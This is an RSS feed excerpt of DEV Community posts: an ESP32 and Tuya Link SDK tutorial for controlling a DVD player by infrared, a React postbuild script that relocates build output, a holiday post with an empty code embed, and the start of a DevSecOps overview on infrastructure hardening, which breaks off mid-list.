<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>CONTROLLING HOME DEVICE (DVD) VIA TUYA LINK SDK AND ESP 32
</title>
      <author>Ogunbiyi Ibrahim</author>
      <pubDate>Fri, 24 Dec 2021 23:59:31 +0000</pubDate>
      <link>https://dev.to/comejoinfolks/controlling-home-device-dvd-via-tuya-link-sdk-and-esp-32-1hfa</link>
      <guid>https://dev.to/comejoinfolks/controlling-home-device-dvd-via-tuya-link-sdk-and-esp-32-1hfa</guid>
      <description>&lt;h2&gt;
  &lt;a href="#introduction"&gt;
  &lt;/a&gt;
  Introduction
&lt;/h2&gt;

&lt;p&gt;Controlling your home devices via the cloud can be so cool and not stressful. With you just picking up your phone and controlling your home device is something you should know much about. In this tutorial, we are going to learn how to control your DVD/ Home theater(Works the same way) via Tuya link SDK and ESP 32.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What we will be building&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;In this tutorial, we will learn how to control our DVD/ Home theater via Tuya link SDK and ESP32.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hardware component&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt; ESP32&lt;/li&gt;
&lt;li&gt;Infrared  led transmitter&lt;/li&gt;
&lt;li&gt;Transistor Bc457&lt;/li&gt;
&lt;li&gt;Ac/dc  5v power supply&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Software Component&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Tuya IoT platform&lt;/li&gt;
&lt;li&gt;Tuya smart App&lt;/li&gt;
&lt;li&gt;Arduino IDE&lt;/li&gt;
&lt;li&gt;Command Prompt&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;GitHub Link: &lt;a href="https://github.com/Folksconnect123/DVD-CONTROL"&gt;https://github.com/Folksconnect123/DVD-CONTROL&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is Tuya&lt;/strong&gt;&lt;br&gt;
Tuya Smart (NYSE: TUYA) is a global IoT development platform that creates interconnectivity standards to connect brands, OEMs, developers, and retailers across a variety of smart devices and industries. Tuya integrates many intelligent scenarios and smart devices by providing hardware development tools, integrating public cloud services, and giving an intelligent business development platform, all of which are based on the global public cloud.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qAEzqqr0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tspxmmxoka5mz72xzwsf.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qAEzqqr0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tspxmmxoka5mz72xzwsf.jpg" alt="Image description" width="880" height="587"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is Tuya link Sdk?&lt;/strong&gt;&lt;br&gt;
Tuya link SDK makes life a lot easier. It facilitates the creation of cloud development projects involving OpenAPI or message subscription capabilities.&lt;/p&gt;

&lt;p&gt;Tuya Link SDK is one such SDK that encapsulates fundamental services like device activation, DP (Data-Points) upstream and downstream, and firmware OTA (Over-The-Air) upgrading into an interface. It is appropriate for connecting the logic services of a self-developed gadget to the cloud by developers.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RxNVBGPy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wr0okxz0f0vr5lm7i0wi.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RxNVBGPy--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wr0okxz0f0vr5lm7i0wi.png" alt="Image description" width="880" height="357"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;What is ESP32?&lt;/strong&gt;&lt;br&gt;
The ESP32 is a low-cost Wi-Fi microchip by Espressif Systems that has built-in TCP/IP networking software and a microprocessor/ Microcontroller capability.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#setting-up-the-environment"&gt;
  &lt;/a&gt;
  &lt;strong&gt;Setting up the environment&lt;/strong&gt;
&lt;/h2&gt;

&lt;p&gt;Before we get started let me give you a heads up that if you haven’t created a tuya account before do create because you will be given a free device license to create a hands-on project.&lt;/p&gt;

&lt;p&gt;To use Tuya Link SDK, we will need to make a product to interact and connect to Tuya IoT Cloud. Go to your Tuya IoT account and log in, if you haven't registered for an account register one &lt;strong&gt;&lt;a href="http://iot.tuya.com/?_source=3bb57e086a1738fc4d1ecf7a7f79188e"&gt;click here&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 1:&lt;/strong&gt; Create a product by clicking on Create button on the home page&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mRJLLnkk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8yrfpml40p0035vuubg5.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mRJLLnkk--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8yrfpml40p0035vuubg5.PNG" alt="Image description" width="880" height="405"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 2:&lt;/strong&gt; A page will appear where you will need to select a category for your project or product, since we are using Esp32 as a custom device so we will need to click on “Can’t find the category” and enter the details as shown below.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--w-MZ8Msh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mxb337zd5r5v1ip8bv5b.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--w-MZ8Msh--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mxb337zd5r5v1ip8bv5b.PNG" alt="Image description" width="880" height="404"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 3:&lt;/strong&gt; We need a standard function for the power state of the DVD (On/Off) and a custom function to be able to control the DVD like (open and close, Skip, Play, etc.). To create a standard function to either switch the DVD on/ off. Click on add and search for Switch then click Ok. Now you have to edit the name of the Switch for more clarity. You can rename it to DVD power _state. If done click on add again and search for Switch 2, then click ok. Also, rename it to Open/close. We also need to create a standard function for Play/pause. Click on add again. And search for switch then rename to Play/Pause. We need to create a custom function for skip (Note that we can also create a standard function for Skip.). On the custom function tab click on add, then set the Data-point to (SkipFor), the identifier to (skipfor) Datatype to (Bool), Data transfer type (Send only). Do the rest for the other function To know more about creating custom functions click on this &lt;strong&gt;&lt;a href="http://iot.tuya.com/?_source=3bb57e086a1738fc4d1ecf7a7f79188e"&gt;link&lt;/a&gt;&lt;/strong&gt;. Keep note of the PID we will need it later.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uuYM3y51--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rx8tg5nv1jzgjr0ycca9.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uuYM3y51--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rx8tg5nv1jzgjr0ycca9.PNG" alt="Image description" width="880" height="405"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 4:&lt;/strong&gt; To interact with the device we need to have a beautiful Panel with all required functionalities, although you can drag and drop UI design in the Tuya design panel since we are working on a prototype and debugging I like to have things very quick I would click on the tuya DIY Style Panel. You can change it to your preference as soon as you are done.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Step 5:&lt;/strong&gt; Go to the Hardware Development Section of your product and click on Link SDK. You will need a license to be able to use link SDK, but don’t bother Tuya issues free licenses for new tech hobbyists.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Hr0pn0Xw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gkx7uut0zfbhbh4y8uyi.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Hr0pn0Xw--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gkx7uut0zfbhbh4y8uyi.PNG" alt="Image description" width="880" height="368"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For ESP32 we are going to use General CPU as a hardware type, also you would see an option to generate a free license if you are new to the platform. Click place the order and download the License list. The** license is composed of tuya UUID and AuthKey** which is needed to authorize the device to receive and send data to the Tuya Cloud.&lt;/p&gt;

&lt;p&gt;Now we are done with the major part of the software development for our Tuya IoT platform now we move to the setting up of the hardware and the implementation of our code.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#installing-tuya-link-sdk"&gt;
  &lt;/a&gt;
  Installing Tuya Link SDK
&lt;/h2&gt;

&lt;p&gt;Now is time to install Tuya link SDK to be able to connect our just completed application above with ESP32. To do that we have to type this code on our command prompt in order to clone the GitHub repository and install tuya link SDK. &lt;/p&gt;

&lt;p&gt;Note: make sure you have Git installed on your pc. If you don’t you can download and install the application.&lt;/p&gt;

&lt;p&gt;The first step is to type this code on the command prompt.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;git clone https://github.com/tuya/tuyaos-link-sdk-python.git
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The second step is to install the tuya link SDK. Note you have to have wheel installed on your machine if you don’t have one. Install it using this line of code. If done, you can finally type the below code.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;pip install wheel 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;python -m pip install ./tuyaos-link-sdk-python
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Now we are done with the installation of the Tuya link SDK you should have this pop-up on your screen if due procedures are followed.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--YJDpzGcR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jc50eb6mdj896vob0nc1.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--YJDpzGcR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jc50eb6mdj896vob0nc1.PNG" alt="Image description" width="880" height="451"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#hardware-setup"&gt;
  &lt;/a&gt;
  Hardware setup:
&lt;/h2&gt;

&lt;p&gt;Grab your ESP32 and other required hardware projects we are ready to get our hands dirty.&lt;/p&gt;

&lt;p&gt;Make sure the required hardware items are complete. Follow the schematics of the hardware and make sure everything is connected properly.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;For receiving the address use this schematic&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You connect the Signal/Data pin of the infrared to D15 on the ESP. The anode of the reciever to 5v and the cathode to the ground.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--khS8BFYI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y8t8ysgsfdtz8d161wac.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--khS8BFYI--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y8t8ysgsfdtz8d161wac.PNG" alt="Image description" width="875" height="450"&gt;&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;&lt;em&gt;For sending the Address to the DVD use this schematic&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;You connect the base pin of the transistor to pin D4 on the ESP 32. The Collector pin of the transistor to ground. Then the Emitter to the cathode of the LED.Then the Anode of the led must be connected with 220 ohms resistor to Vin.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_yFiw_vS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ccmia6vrmo8xqnff8g2.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_yFiw_vS--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4ccmia6vrmo8xqnff8g2.PNG" alt="Image description" width="875" height="456"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#implementing-your-program"&gt;
  &lt;/a&gt;
  Implementing your Program
&lt;/h2&gt;
&lt;h3&gt;
  &lt;a href="#getting-the-address-from-the-remote"&gt;
  &lt;/a&gt;
  Getting the address from the remote.
&lt;/h3&gt;

&lt;p&gt;Now that we have gotten to this level, the next step to be done is to implement the code. Download the  IRremote_decode file from the Git hub account.&lt;/p&gt;

&lt;p&gt;Now run the IRremote_decode file and open the Serial monitor to get the address from your Remote after that you can now modify the DVD_control file to input the address.&lt;/p&gt;

&lt;p&gt;This is the hardware schematics for the remote decoder address.&lt;/p&gt;

&lt;p&gt;For ESP32 connect the Signal pin of the IR receiver to 15 and the Positive pin to 5v, the last pin to the ground.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7HrZij1d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5c9lflxugwyabhyihdhb.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7HrZij1d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5c9lflxugwyabhyihdhb.PNG" alt="Image description" width="880" height="404"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This is the address from my remote controller. Then I have inserted the address into the DVD code.&lt;/p&gt;

&lt;p&gt;Modifying the DVD_Control file&lt;/p&gt;

&lt;p&gt;After you’ve gotten the address you can now modify the DVD_control file from GitHub to your own address like this.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--1Bs-ggWC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zfvxoh5rbcqrcavme3xt.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--1Bs-ggWC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zfvxoh5rbcqrcavme3xt.PNG" alt="Image description" width="880" height="336"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You can run the file and test the code via the serial monitor with your DVD on to see if everything is going perfectly.&lt;/p&gt;
&lt;h2&gt;
  &lt;a href="#finalizing-our-work"&gt;
  &lt;/a&gt;
  Finalizing our work
&lt;/h2&gt;

&lt;p&gt;After you’ve successfully uploaded and run the above code it is time to control our microcontroller via the cloud. Now Download the TuyaLinkSDk file from GitHub and modify the code for your PID, Auth key and UUID, and the COM port of your microcontroller. After those are done then you can now run the code on your command prompt by using the cd method. Like in my own case I copied the file to the desktop, then I typed this on my command prompt&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;cd desktop&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;Then you type the name of the file. In my own case TuyaLinkSDK.py&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VALZ7IYP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y4hc5jpdodqdp6n2g6y0.PNG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VALZ7IYP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y4hc5jpdodqdp6n2g6y0.PNG" alt="Image description" width="880" height="461"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;You should have this after you’ve successfully run the code. Now you can download the Tuya smart app from Playstore and click on add new device, then scan the code to add the device.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--AALmDMaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8i1m5r3r6hu2zuu9b6pr.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--AALmDMaR--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8i1m5r3r6hu2zuu9b6pr.png" alt="Image description" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sS7KC-4Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tlh512oes06qgk1c6roh.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--sS7KC-4Z--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tlh512oes06qgk1c6roh.jpg" alt="Image description" width="880" height="386"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Here is the video to the output. &lt;a href="https://youtu.be/VcfcegE9fgk"&gt;https://youtu.be/VcfcegE9fgk&lt;/a&gt;. Thank you for reading.&lt;/p&gt;

</description>
      <category>iot</category>
      <category>cloud</category>
      <category>arduino</category>
      <category>tuya</category>
    </item>
    <item>
      <title>Custom Build folder for React</title>
      <author>Arjun Santhosh</author>
      <pubDate>Fri, 24 Dec 2021 23:48:56 +0000</pubDate>
      <link>https://dev.to/arjunsanthoshpnr/custom-build-folder-for-react-2oi</link>
      <guid>https://dev.to/arjunsanthoshpnr/custom-build-folder-for-react-2oi</guid>
      <description>&lt;p&gt;In this article, we will learn how to change the Build path of a React application. Here I'm using a shell script for moving the contents inside the build folder to another location. &lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;p&gt;Create a &lt;strong&gt;{file-name}.sh&lt;/strong&gt; file inside the root directory of your react app. &lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Open to your &lt;strong&gt;package.json&lt;/strong&gt; file.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Just beneath the build script, add a new one called "&lt;strong&gt;postbuild&lt;/strong&gt;" with a value "./{file-name}.sh".&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
&lt;p&gt;&lt;em&gt;if you are using Windows, use bash before executing the script.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--veM76Egl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6wu9ivyubo0hd3p1osbl.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--veM76Egl--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6wu9ivyubo0hd3p1osbl.png" alt="Image description" width="416" height="173"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This shell script is executed right after the build process, and the actual magic happens inside the shell script.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;#If the folder exists, remove it first, then copy the files
if [ -d "./../server/public/${APP_NAME}/" ]; then

    rm -rv ./../server/public/${APP_NAME}/*
    mv -v build/* ./../server/public/${APP_NAME}/

#Else make a new folder and then move the files.
else
    mkdir -p ./../server/public/${APP_NAME}
    mv -v build/* ./../server/public/${APP_NAME}/
fi

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In my case, I just wanted to move the build folder contents to my server folder.&lt;br&gt;
Before moving the content inside the build folder, I checked whether the output folder was already exiting. If there is a folder, I want to clean it first and move the contents. &lt;/p&gt;

&lt;p&gt;This script can be customized to your need. Just go through some simple shell-script tutorials. Here what is helping us is the '&lt;strong&gt;postbuild&lt;/strong&gt;' script that will be automatically executed after the build command.&lt;/p&gt;

&lt;p&gt;Happy Coding 🥳&lt;/p&gt;

</description>
      <category>react</category>
      <category>bash</category>
    </item>
    <item>
      <title>Happy Holidays: From a developer with code!</title>
      <author>Bruno Noriller</author>
      <pubDate>Fri, 24 Dec 2021 22:45:28 +0000</pubDate>
      <link>https://dev.to/noriller/happy-holidays-from-a-developer-with-code-5n7</link>
      <guid>https://dev.to/noriller/happy-holidays-from-a-developer-with-code-5n7</guid>
      <description>&lt;p&gt;This is a present for you!&lt;/p&gt;

&lt;p&gt;I wrapped it in a way you have to “open it” to learn what’s inside.&lt;/p&gt;

&lt;p&gt;Unless... can you can guess what this does before running it?&lt;/p&gt;

&lt;p&gt;The present:&lt;/p&gt;


&lt;div class="ltag_gist-liquid-tag"&gt;
  
&lt;/div&gt;


&lt;p&gt;Happy Holidays!&lt;/p&gt;




&lt;p&gt;Cover Photo by &lt;a href="https://unsplash.com/@kadh?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Kira auf der Heide&lt;/a&gt; on &lt;a href="https://unsplash.com/s/photos/present?utm_source=unsplash&amp;amp;utm_medium=referral&amp;amp;utm_content=creditCopyText"&gt;Unsplash&lt;/a&gt;&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>watercooler</category>
    </item>
    <item>
      <title>DevSecOps: Implement security on CICD Pipeline</title>
      <author>Anshuman Abhishek</author>
      <pubDate>Fri, 24 Dec 2021 22:05:05 +0000</pubDate>
      <link>https://dev.to/_anshuman/devsecops-implement-security-on-cicd-pipeline-4kc5</link>
      <guid>https://dev.to/_anshuman/devsecops-implement-security-on-cicd-pipeline-4kc5</guid>
      <description>&lt;p&gt;&lt;strong&gt;Let' Start&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://i.giphy.com/media/wPDSMT9n2WCmVuHkJO/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/wPDSMT9n2WCmVuHkJO/giphy.gif" width="400" height="400"&gt;&lt;/a&gt;&lt;br&gt;
&lt;br&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-is-devsecops"&gt;
  &lt;/a&gt;
  What is Dev-Sec-Ops?
&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;DevSecOps&lt;/strong&gt; stands for development, security, and operations. It's an approach to culture, automation, and platform design that integrates security as a shared responsibility throughout the entire IT lifecycle.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;It is a endless field. Here we only focus about Infra and DevOps level security. We will discuss on both OSS and Paid tools which we can implement on CICD pipeline to make secure.&lt;/p&gt;
&lt;/blockquote&gt;



&lt;h2&gt;
  &lt;a href="#what-is-cis"&gt;
  &lt;/a&gt;
  What is CIS?
&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;The &lt;strong&gt;Centre for Internet Security&lt;/strong&gt; (CIS) provides a standardized set of security benchmarks to identify and refine effective security measures for specific set of tools and technologies.
&lt;/li&gt;
&lt;li&gt;It provides security benchmark and the National Checklist Program (NCP), defined by the NIST &lt;/li&gt;
&lt;li&gt;They offer guidance on the security configurations of the operating system, clouds, database, virtualization, framework, and application &lt;/li&gt;
&lt;li&gt;In addition to the benchmark documents, the CIS also provides downloadable tools for secure configuration scanning
&lt;a href="https://www.cisecurity.org/cis-benchmarks/"&gt;cisecurity.org/cis-benchmarks/ &lt;/a&gt;
&lt;/li&gt;
&lt;li&gt;Best practice is to implement multiple scanning tool instead of trust on one.&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;
  &lt;a href="#how-devsecops-pipeline-looks-like"&gt;
  &lt;/a&gt;
  How DevSecOps pipeline looks like?
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--gG_TdKRv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2mnmkd0d9vi5mtc89rol.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--gG_TdKRv--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2mnmkd0d9vi5mtc89rol.png" alt="DevSecOps Pipeline" width="880" height="606"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We will cover how to implement these:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Design&lt;/li&gt;
&lt;li&gt;Develop&lt;/li&gt;
&lt;li&gt;Build&lt;/li&gt;
&lt;li&gt;Test&lt;/li&gt;
&lt;li&gt;Deploy&lt;/li&gt;
&lt;li&gt;Monitor&lt;/li&gt;
&lt;/ul&gt;



&lt;h2&gt;
  &lt;a href="#design"&gt;
  &lt;/a&gt;
  Design
&lt;/h2&gt;

&lt;p&gt;Security and monitoring is always a second step, 1st step is to harden your infrastructure. &lt;/p&gt;

&lt;p&gt;More than 80% attacks happens because of misconfiguration&lt;/p&gt;

&lt;p&gt;In AWS, you can check how much percentage your server follow the CIS benchmark. But also keep in mind CIS =! Enough &lt;br&gt;
You should not rely only on CIS and always follow best security practices &lt;/p&gt;

&lt;p&gt;When you create a server in AWS with just port 22 open. You notice that there will be multiple attempt start happening. It will reach to 100-1000 within 1 week. &lt;/p&gt;

&lt;p&gt;Check the vulnerability vectors you have in your system/environment where attacker can push their code or extract data. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Attack Surface&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The attack surface of a system is the collection of points(attack vectors) where unauthorized user (attacker) may enter to inject data to or extract data from an environment &lt;/li&gt;
&lt;li&gt;Keeping the attack surface as small as possible is a basic security measure &lt;/li&gt;
&lt;li&gt;Ex - Use bastion server and put all the servers in private subnet
&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;IAM&lt;/strong&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Identity and Access Management (IAM) is the process of granting or restricting access to computing resources for individual users, groups, or systems. &lt;/li&gt;
&lt;li&gt;IAM - Authentication, Authorization, User Management, and Credentials Repository &lt;/li&gt;
&lt;li&gt;Best practice is to &lt;strong&gt;Fine-Grained&lt;/strong&gt; IAM Roles for Service Accounts and Users&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Network Security&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Implement private subnets. Deploy your VMs with only private IPs. Provide secure outbound internet connections with Cloud NAT&lt;/li&gt;
&lt;li&gt;Turn on real-time monitoring, logging, and alerting&lt;/li&gt;
&lt;li&gt;Best practice is to only implement public faced LB. Also enable services like web-application firewall (WAF) and DDoS mitigation service like cloud armor.&lt;/li&gt;
&lt;li&gt;Fine grained networking policy on servers, resources and VPCs. Only open required IP range and ports.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Server Hardening&lt;/strong&gt; &lt;/p&gt;

&lt;ul&gt;
